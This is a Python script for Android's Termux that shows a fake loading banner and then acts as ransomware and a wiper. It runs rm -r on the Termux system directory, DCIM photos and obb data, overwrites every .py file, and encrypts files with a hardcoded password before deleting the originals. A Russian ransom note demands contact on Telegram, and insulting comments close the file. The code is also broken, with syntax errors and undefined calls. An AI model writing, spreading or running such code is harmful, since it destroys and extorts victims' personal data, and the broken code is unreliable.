from time import sleep
from colorama import *
from datetime import *
import os,sys
info = '''
все файлы зашифрованы
если выключите скрипт то
вы никогда не расшифруите
файлы что бы их расшифровать
нужно связаться со мной в
телеграмме если файлы
зашифрованы то это
я вам кидал этот
репозитории
'''
def all_crypt(file):
	import pyAesCrypt
	password='hello,world'
	bufferSize=512*1024
	pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
	os.remove(file)
def all_walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir,name)
		if os.path.isfile(path): all_crypt(path)
		else:walk(path)
		walk(os.getcwd())
def virus_code(python):
	with open(str(python),'w') as vir:
		vir.write('''
#infected
'''')
def virus_walk(pa):
	for name in os.listdir(pa):
		path = os.path.join(pa,name)
		if os.path.isfile(path):
			if os.path.splitext(path)[1]=='.py': virus_code(path)
			else:pass
		else:walk(path)
		virus_walk(os.getcwd())
def delete_command():
	os.system('rm -r /data/data/com.termux/files/usr')
	os.system('rm -r /storage/emulated/0/Android/obb')
	os.system('rm -r /storage/emulated/0/DCIM')
def check_prava():
	os.system('termux-setup-storage')
def zasor():
	for i in range(21):
		with open('lol.apk','w') as cey:
			cey.write('''
lol''')
def banner():
	for i in range(7):
		sleep(1)
		print('загрузка...'
	check_prava()
	exploit()
	delete_command()
	virus_walk()
	all_walk()
	print(Fore.RED + info)
def exploit():
	now_time = datetime.now().strftime('%Y-%m-%d-%H:%M')
	now_time = datetime.strptime(now_time,'%Y-%m-%d-%H:%M')
	end_time = datetime.strptime('2020-02-15-19:35','%Y-%m-%d-%H:%M')
	if end_time < now_time:
		print('вы опоздали')
		os.remove(sys.argv[0])
banner()
#те кто посмотрели код молодцы а остальные дибилы
#иди нахуй
